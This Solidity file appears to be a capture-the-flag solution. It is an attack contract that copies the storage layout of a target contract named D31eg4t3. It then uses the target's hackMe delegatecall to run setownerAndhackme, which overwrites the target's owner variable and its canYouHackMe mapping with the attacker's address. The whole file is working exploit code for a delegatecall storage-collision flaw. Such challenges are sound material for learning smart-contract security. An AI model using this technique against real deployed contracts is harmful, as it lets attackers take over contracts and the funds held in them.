// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./delegate.sol";

contract AttackD31eg4t3{


    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    D31eg4t3 public delegatecontract;

    constructor (address _targetcontractaddress) {
        delegatecontract = D31eg4t3(_targetcontractaddress);
    }


    //function for the ctf objectives
    function setownerAndhackme (address _owneraddress) public {
        owner = _owneraddress;
        canYouHackMe[_owneraddress] = true;
    }

    function attackd31eg4t3contract() public{
        (bool success,) = delegatecontract.hackMe(abi.encodeWithSignature("setownerAndhackme(address)",msg.sender));
        require(success,"failed delegation");
    }



}